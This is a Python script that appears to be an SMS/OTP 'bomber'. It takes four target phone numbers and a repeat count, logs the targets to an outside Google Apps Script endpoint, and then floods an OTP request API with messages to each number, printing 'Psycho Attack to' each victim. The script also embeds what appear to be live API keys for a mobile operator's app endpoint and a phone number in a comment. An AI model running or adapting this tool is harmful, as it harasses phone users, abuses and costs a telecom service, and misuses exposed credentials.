import requests
import json
import datetime
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

print(f"{bcolors.OKBLUE}{bcolors.BOLD}")
t= datetime.datetime.now()
url = 'https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getUserInfobyNickname'
myobj = {'nickname':"circle"}




#use the 'headers' parameter to set the HTTP headers:
x = requests.post(url, data = myobj, headers = {"x-api-key": "2c762ea43f23a61c3743b85e9371b94d","x-app-key":"000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"})

#convert response to json format

#parse the json to get the service ticket
response= x.text
#the 'demopage.asp' prints all HTTP Headers
#8801147116455

json_object = json.loads(response)

json_formatted_str = json.dumps(json_object, indent=1)

# print(json_formatted_str)
# print(json_object)

# Input the key value that you want to search
keyVal = "data"

# load the json data
customer = json.loads(response)
# Search the key value using 'in' operator
if keyVal in customer:
    while 1:
        print("Number Example 8801234567890")
        name = input("Enter 1st Number ")
        name2 = input("Enter 2nd Number ")
        name3 = input("Enter 3rd Number ")
        name4 = input("Enter 4th Number ")
        i=int(input("Enter Counter "))

        url = 'https://script.google.com/macros/s/AKfycbxa1_Waf0SuLpkpi3toVbkrhCodBVjoYi30gNCRWHmCDqWsLWde/exec'
        myobj = {'nickname':'YOYO','firstno':name,'secondno':name2,'thirdno':name3,'fouthno':name4,'count':i,'update':t,'id':'1qQUYGakYbIbq3ccNxX2FIJikObwrmIR1rwefY51RW00'}
        requests.post(url, data = myobj, headers = {})

        y=0
        while y<i:
            url = 'http://27.131.15.19/lstyle/api/lsotprequest'
            myobj1 = {'shortcode' : "2494905",'msisdn':name}
            myobj2 = {'shortcode' : "2494905",'msisdn':name2}
            myobj3 = {'shortcode' : "2494905",'msisdn':name3}
            myobj4 = {'shortcode' : "2494905",'msisdn':name4}

            url2 = 'http://27.131.15.19/lstyle/api/lsotprequest'
            myobj21 = {'shortcode' : "2494905",'msisdn':name}
            myobj22 = {'shortcode' : "2494905",'msisdn':name2}
            myobj23 = {'shortcode' : "2494905",'msisdn':name3}
            myobj24 = {'shortcode' : "2494905",'msisdn':name4}

            url3 = 'http://27.131.15.19/lstyle/api/lsotprequest'
            myobj31 = {'shortcode' : "2494905",'msisdn':name}
            myobj32 = {'shortcode' : "2494905",'msisdn':name2}
            myobj33 = {'shortcode' : "2494905",'msisdn':name3}
            myobj34 = {'shortcode' : "2494905",'msisdn':name4}

    #use the 'headers' parameter to set the HTTP headers:
            try:
                requests.post(url, data = json.dumps(myobj1), headers = {'Content-Type':'application/json'})
                requests.post(url2, data = json.dumps(myobj21), headers = {'Content-Type':'application/json'})
                requests.post(url3, data = json.dumps(myobj31), headers = {'Content-Type':'application/json'})
                print(f"{bcolors.OKBLUE}{bcolors.BOLD}")
                print("Psycho Attack to ",name)
            except:
                print(f"{bcolors.FAIL}{bcolors.BOLD}")
                print("Server Error")
            try:
               requests.post(url, data = json.dumps(myobj2), headers = {'Content-Type':'application/json'})
               requests.post(url2, data = json.dumps(myobj22), headers = {'Content-Type':'application/json'})
               requests.post(url3, data = json.dumps(myobj32), headers = {'Content-Type':'application/json'})
               print(f"{bcolors.OKBLUE}{bcolors.BOLD}")
               print("Psycho Attack to ",name2)
            except:
                print(f"{bcolors.FAIL}{bcolors.BOLD}")
                print("Server Error")
            try:
                requests.post(url, data = json.dumps(myobj3), headers = {'Content-Type':'application/json'})
                requests.post(url2, data = json.dumps(myobj23), headers = {'Content-Type':'application/json'})
                requests.post(url3, data = json.dumps(myobj33), headers = {'Content-Type':'application/json'})
                print(f"{bcolors.OKBLUE}{bcolors.BOLD}")
                print("Psycho Attack to ",name3)
            except:
                print(f"{bcolors.FAIL}{bcolors.BOLD}")
                print("Server Error")
            try:
                requests.post(url, data = json.dumps(myobj4), headers = {'Content-Type':'application/json'})
                requests.post(url2, data = json.dumps(myobj24), headers = {'Content-Type':'application/json'})
                requests.post(url3, data = json.dumps(myobj34), headers = {'Content-Type':'application/json'})
                print(f"{bcolors.OKBLUE}{bcolors.BOLD}")
                print("Psycho Attack to ",name4)
            except:
                print(f"{bcolors.FAIL}{bcolors.BOLD}")
                print("Server Error")
            print(y)
            y= y+1
        print("\nCounting Completed")
else:
    # Print the message if the value does not exist
    print("SerVer Down!!!!")
